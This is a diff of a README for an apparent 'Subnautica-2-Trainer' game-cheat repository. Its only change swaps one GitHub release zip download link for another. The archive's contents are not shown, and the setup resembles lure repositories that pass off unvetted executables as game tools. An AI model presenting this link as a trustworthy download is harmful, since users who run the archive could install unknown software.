@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download Subnautica-2-Trainer](https://github.com/Outpostthroughnotice/Subnautica-2-Trainer/releases/download/7859/Subnautica2Train.zip)**
+**[Download Subnautica-2-Trainer](https://github.com/Outpostthroughnotice/Subnautica-2-Trainer/releases/download/7860/SubnauticaTrainer2.zip)**
 
 ---
 
